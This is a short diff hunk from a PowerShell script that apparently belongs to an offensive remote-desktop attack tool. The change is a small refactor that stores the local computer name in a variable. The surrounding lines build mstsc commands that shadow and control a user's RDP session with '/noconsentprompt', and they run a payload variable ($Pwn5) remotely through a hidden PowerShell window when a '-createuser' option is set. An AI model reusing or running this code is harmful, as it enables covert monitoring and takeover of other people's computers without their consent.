@@ -486,7 +486,7 @@ function Remove-Exclusions {
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-if ($nogui){ Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v $env:computername.tolower() /admin /shadow:$shadow /control /noconsentprompt /prompt /f"
+if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f"
 if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host $txt38 -ForegroundColor Red ; sleep -milliseconds 4000 }
 
